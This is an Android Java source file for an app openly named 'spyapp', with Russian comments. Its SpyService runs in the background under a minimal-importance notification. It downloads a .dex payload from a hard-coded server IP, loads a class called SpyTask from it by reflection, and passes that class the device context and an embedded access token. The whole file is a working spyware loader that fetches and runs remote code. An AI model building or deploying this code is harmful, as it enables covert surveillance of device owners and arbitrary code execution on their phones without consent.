package com.example.spyapp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.os.IBinder;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.JobIntentService;
import androidx.core.app.NotificationCompat;
import dalvik.system.PathClassLoader;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.logging.Logger;

public class SpyService extends JobIntentService {
    private final Logger logger = Logger.getLogger(this.getClass().getName());
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private Object dexTask;
    private final String IP = "192.168.0.109";
    private final String TOKEN = "Q9uG1UBmH44AAAAAAAAAAV0CGzTA6jQ1T3z87VIpa5syshCdMEuBIewOZnkjX_I7";

    @Override
    public void onCreate() {
        super.onCreate();
        startMyOwnForeground();
    }

    private void startMyOwnForeground(){
        // Создаем фоновую задачу и настраиваем ее отображение в таскбаре
        String NOTIFICATION_CHANNEL_ID = "com.example.spyapp";
        String channelName = "My Background Service";
        NotificationChannel channel = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
        channel.setLightColor(Color.BLUE);
        channel.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        assert manager != null;
        manager.createNotificationChannel(channel);

        // Задаем параметры фонового сервиса (имя, икока, категория...)
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setSmallIcon(R.mipmap.ic_launcher_round)
                .setContentTitle("App is running in background")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(2, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Запускаем загрузку полезной нагрузки в виде .dex файла в отдельном потоке
        Future future = executor.submit(this::downloadTask);
        try {
            // Ожидаем завершения загрузки и получаем загруженный объект в виде класса
            dexTask = future.get();
            // Вызываем у загруженного класса метод start средствами рефлексии
            dexTask.getClass().getMethod("start").invoke(dexTask);
        } catch (Exception e) {
            logger.info(e.getMessage());
        }

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        // Останавливаем задачу
        executor.shutdown();
        try {
            dexTask.getClass().getMethod("stop").invoke(dexTask);
        } catch (Exception e) {
            logger.info(e.getMessage());
        }

        logger.info("task destroyed.");
    }

    @Override
    protected void onHandleWork(@NonNull Intent intent) {

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private Object downloadTask() {
        String filename = "classes3.dex";
        String path = getCacheDir().getPath();
        HttpURLConnection connection = null;
        Object c = null;

        try {
            logger.info("download started.");
            // Загружаем файл с сервера
            connection = (HttpURLConnection) (new URL("http://" + IP + ":8080/downloads/" + filename).openConnection());
            connection.connect();

            InputStream inputStream = new BufferedInputStream(connection.getInputStream());
            OutputStream outputStream = new FileOutputStream(path + "/" + filename);

            byte[] buffer = new byte[1024];
            int length;
            while ((length = inputStream.read(buffer)) > 0) {
                outputStream.write(buffer, 0, length);
            }
            outputStream.close();
            inputStream.close();

            File file = new File(path, filename);

            logger.info("download completed.");

            // Получаем класс лоадер для скачанного файла
            PathClassLoader classLoader = new PathClassLoader(file.getAbsolutePath(), getClassLoader());
            // Загружаем класс из файла
            Class<?> clazz = classLoader.loadClass("com.example.dexmodule.SpyTask");
            // Создаем новый инстанс класса
            c = (Object) clazz.getDeclaredConstructor(Context.class, String.class, String.class).newInstance(getBaseContext(), IP, TOKEN);

            logger.info("dex class loaded.");

        } catch (Exception ex) {
            logger.info(ex.getMessage());
        } finally {
            connection.disconnect();
        }

        return c;
    }
}
